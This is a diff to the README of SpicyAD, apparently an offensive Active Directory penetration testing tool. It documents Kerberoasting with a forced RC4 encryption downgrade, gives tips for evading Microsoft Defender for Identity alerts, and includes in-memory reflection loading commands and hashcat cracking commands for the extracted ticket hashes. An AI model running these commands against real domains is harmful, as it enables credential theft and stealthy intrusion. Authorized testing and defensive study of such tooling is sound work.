@@ -84,7 +84,7 @@ SpicyAD is a C# Active Directory penetration testing tool designed for authorize
 | Category | Capabilities |
 |----------|--------------|
 | **Enumeration** | Domain info, DCs, users, computers, shares (SYSVOL/NETLOGON/all), trusts, delegations (Unconstrained/Constrained/RBCD), LAPS, certificate templates (ESC1-4, ESC8), **BloodHound Ingestor** |
-| **Kerberos Attacks** | Kerberoasting (RC4/AES), AS-REP Roasting, Password Spray, Pass-the-Ticket, Targeted Kerberoasting |
+| **Kerberos Attacks** | Kerberoasting with **RC4 downgrade via LSA** (Rubeus `/tgtdeleg` style, on by default; `/rc4only` `/aes-only` `/no-downgrade` to control) + AS-REP Roasting, Password Spray, Pass-the-Ticket, Targeted Kerberoasting |
 | **ADCS Attacks** | ESC1 (arbitrary SAN), ESC4 (Template Hijacking), PKINIT + UnPAC-the-hash |
 | **Credentials** | Shadow Credentials, RBCD |
 | **AD Management** | Add/delete users, add machines, group management, password changes |
@@ -509,9 +509,24 @@ Read LAPS passwords (all computers or specific target).
 
 Enumerate vulnerable certificate templates (ESC1-4, ESC8).
 
+**Published-only by default:** a template is only reported as vulnerable when at least one Enterprise CA has it in its `certificateTemplates` attribute (i.e. it is actually enrollable). Unpublished templates cannot be exploited via enrollment, so flagging them was a false positive — they are now hidden. Use `/all` to include them (marked `[UNPUBLISHED - not exploitable]`) for audit context.
+
+The report tags each hit and lists where it is published:
+```
+[!] VULNERABLE [PUBLISHED]: User (User)
+    Published on CA(s): CORP-CA-01
+    [ESC1] Client Auth + ENROLLEE_SUPPLIES_SUBJECT
+```
+
+| Flag | Behavior |
+|------|----------|
+| *(none)* | Only report templates published on at least one CA (exploitable). |
+| `/all` (`--all`, `/include-unpublished`) | Also list unpublished templates (audit view). |
+
 **Domain-Joined:**
 ```powershell
-.\SpicyAD.exe enum-vulns
+.\SpicyAD.exe enum-vulns          # only exploitable
+.\SpicyAD.exe enum-vulns /all     # include unpublished for audit
 ```
 
 **Non-Domain-Joined:**
@@ -562,9 +577,34 @@ Enumerate all certificate templates (Certify-style output).
 
 Extract TGS hashes for offline cracking.
 
+**Encryption downgrade (domain-joined only):**
+
+By **default**, SpicyAD tries to force the KDC to issue tickets encrypted with **RC4-HMAC (etype 23)** — the format hashcat can crack the fastest (mode 13100 is ~10× faster than AES). It does this via `LsaCallAuthenticationPackage` + `KERB_RETRIEVE_ENCODED_TICKET_MESSAGE` with `EncryptionType = 23` (Rubeus `/tgtdeleg` style). If the target account or KDC refuses RC4 (`msDS-SupportedEncryptionTypes` set to AES-only, or global policy blocks RC4), it falls back to AES256 → AES128 → the legacy `KerberosRequestorSecurityToken` API.
+
+> ⚠️ **OPSEC:** Microsoft Defender for Identity (MDI) flags RC4 downgrade as **"Suspected encryption downgrade activity (Skeleton Key)"**. Use `/aes-only` in monitored engagements.
+
+| Flag | Behavior |
+|------|----------|
+| *(none)* | **Auto** — try RC4 first, fall back to AES/legacy. Loudest but best crack speed. |
+| `/rc4only` | Only ask for RC4. Skip SPNs where the account/KDC refuses it. |
+| `/aes-only` | Only ask for AES (18 → 17). Quiet against MDI. |
+| `/no-downgrade` | Skip LSA path; use the legacy API (whatever etype the account supports). |
+
+The mode is printed at start:
+```
+[*] Kerberoast etype mode: Auto
+[+] LSA ticket via etype-request=23, got RC4-HMAC (1876 bytes)
+[+] Successfully created hash for SVC_SQL
+```
+
+Non-domain-joined runs (with `/user:` `/password:`) go through the raw Kerberos path and always request `[23, 18, 17]` — the KDC picks the strongest supported. The flags above are ignored in that mode.
+
 **Domain-Joined:**
 ```powershell
-.\SpicyAD.exe kerberoast
+.\SpicyAD.exe kerberoast                # Auto (RC4 downgrade attempt)
+.\SpicyAD.exe kerberoast /rc4only       # force RC4, skip AES-only accounts
+.\SpicyAD.exe kerberoast /aes-only      # avoid MDI encryption-downgrade alerts
+.\SpicyAD.exe kerberoast /no-downgrade  # classic KerberosRequestorSecurityToken
 ```
 
 **Non-Domain-Joined:**
@@ -575,6 +615,7 @@ Extract TGS hashes for offline cracking.
 **Reflection:**
 ```powershell
 [Reflection.Assembly]::LoadFile("C:\Users\Public\SpicyAD.exe") | Out-Null; [SpicyAD.Program]::Execute("kerberoast")
+[Reflection.Assembly]::LoadFile("C:\Users\Public\SpicyAD.exe") | Out-Null; [SpicyAD.Program]::Execute("kerberoast", "/aes-only")
 
 # Non-Domain-Joined
 [Reflection.Assembly]::LoadFile("C:\Users\Public\SpicyAD.exe") | Out-Null; [SpicyAD.Program]::Execute("/domain:evilcorp.net", "/dc-ip:10.10.10.10", "/user:admin", "/password:P@ssw0rd", "kerberoast")
@@ -582,10 +623,12 @@ Extract TGS hashes for offline cracking.
 
 **Crack with Hashcat:**
 ```bash
-hashcat -m 13100 hash.txt wordlist.txt  # RC4
+hashcat -m 13100 hash.txt wordlist.txt  # RC4     (fastest)
 hashcat -m 19600 hash.txt wordlist.txt  # AES128
 hashcat -m 19700 hash.txt wordlist.txt  # AES256
 ```
+
+> The output format is picked automatically per etype: `$krb5tgs$23$*user$realm$spn*$...` for RC4, `$krb5tgs$18$user$realm$*spn*$...` for AES. If hashcat complains "Separator unmatched", you are running an old build — see the SHA256 in releases.
 
 ---
 
